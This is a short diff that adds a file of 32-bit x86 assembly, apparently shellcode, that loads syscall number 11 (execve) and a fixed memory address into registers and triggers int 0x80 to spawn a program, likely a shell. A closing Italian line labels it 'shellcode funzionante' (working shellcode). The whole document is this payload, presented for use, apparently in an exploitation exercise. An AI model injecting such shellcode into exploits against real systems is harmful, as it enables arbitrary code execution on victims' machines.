@@ -1,0 +1,9 @@
+xor eax, eax
+push 0x0b
+pop eax
+mov ebx, 0x804c440
+xor ecx, ecx
+xor edx, edx
+int 0x80
+
+shellcode funzionante
